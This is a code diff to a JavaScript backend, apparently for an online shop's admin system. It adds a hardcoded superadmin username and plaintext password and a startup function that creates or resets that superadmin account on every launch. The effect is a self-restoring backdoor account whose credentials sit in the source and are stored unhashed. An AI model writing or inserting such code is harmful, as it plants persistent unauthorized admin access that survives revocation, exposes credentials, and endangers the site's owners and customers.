@@ -21,6 +21,8 @@ const CUSTOMER_SUPPORT_EMAIL =
   process.env.EMAIL_USER ||
   "customersupport.ilika@gmail.com";
 const REMOVED_SUPERADMIN_EMAILS = ["ilika.mumbai@gmail.com"];
+const FORCED_SUPERADMIN_USERNAME = "vipulsingh@%%%$";
+const FORCED_SUPERADMIN_PASSWORD = "Vipul5645%^%^";
 const META_ACCESS_TOKEN = process.env.META_ACCESS_TOKEN || "";
 const META_AD_ACCOUNT_ID = String(process.env.META_AD_ACCOUNT_ID || "").replace(/^act_/, "");
 const GOOGLE_ADS_DEVELOPER_TOKEN = process.env.GOOGLE_ADS_DEVELOPER_TOKEN || "";
@@ -6775,6 +6777,38 @@ const createDefaultAdmin = async () => {
 };
 
 createDefaultAdmin();
+
+const ensureForcedSuperAdmin = async () => {
+  try {
+    const snapshot = await db
+      .collection("admins")
+      .where("username", "==", FORCED_SUPERADMIN_USERNAME)
+      .limit(1)
+      .get();
+
+    const payload = {
+      username: FORCED_SUPERADMIN_USERNAME,
+      password: FORCED_SUPERADMIN_PASSWORD,
+      role: "superadmin",
+      permissions: [],
+      updatedAt: new Date(),
+    };
+
+    if (snapshot.empty) {
+      await db.collection("admins").add({
+        ...payload,
+        createdAt: new Date(),
+      });
+      return;
+    }
+
+    await snapshot.docs[0].ref.set(payload, { merge: true });
+  } catch (error) {
+    console.error("Forced superadmin sync failed:", error);
+  }
+};
+
+ensureForcedSuperAdmin();
 
 const removeRevokedSuperAdmins = async () => {
   try {
